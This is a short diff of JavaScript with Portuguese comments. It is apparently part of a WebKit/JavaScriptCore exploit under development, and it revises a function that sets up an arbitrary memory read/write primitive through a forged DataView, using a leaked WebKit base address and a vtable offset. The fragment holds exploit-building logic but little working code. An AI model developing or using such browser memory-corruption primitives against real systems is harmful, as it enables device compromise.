@@ -47,16 +47,15 @@ let _fake_data_view = null;
  * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
  * @returns {boolean} True se a primitiva foi configurada com sucesso.
  */
-async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress) { // Removido o argumento de vazamento da Structure* real, agora aceita o endereço do vtable
+async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress) { // Adicionado dataViewStructureVtableAddress
     const FNAME = "setupUniversalArbitraryReadWrite";
     logFn(`[${FNAME}] Iniciando configuração da primitiva de L/E Arbitrária Universal via fake DataView...`, "subtest", FNAME);
 
     let success = false; // Flag para controlar o fluxo de saída
 
     try {
-        // --- REMOVIDO: Bloco de vazamento da Structure* de um DataView real.
-        // Já vazamos o webkit_base_address, e temos o offset estático do vtable da Structure.
-        // Usaremos esse valor diretamente para plantar.
+        // --- REMOVIDO TODO O BLOCO DE VAZAMENTO DA STRUCTURE* DE UM DATAVIEW REAL USANDO OOB ORIGINAL ---
+        // A Structure* (ou seu vtable, que é o mesmo endereço) é agora CALCULADA usando o webkit_base_address e o offset estático.
 
         // 1. Criar um objeto JavaScript simples que servirá como o "corpo" do nosso DataView forjado.
         const fake_dv_backing_object = {
@@ -143,7 +142,7 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
     } finally {
         // Nada para restaurar aqui em termos de oob_dataview_real m_vector,
         // pois não o manipulamos dentro desta função para o vazamento de Structure*.
-        // A restauração já ocorre no executeTypedArrayVictimAddrofAndWebKitLeak_R43.
+        // A restauração já ocorre no executeTypedArrayVictimAddrofAndWebKitLeak_R43 (se a fase 2.5 passou).
         logFn(`--- Configuração da L/E Universal Concluída ---`, "test", FNAME);
     }
 }
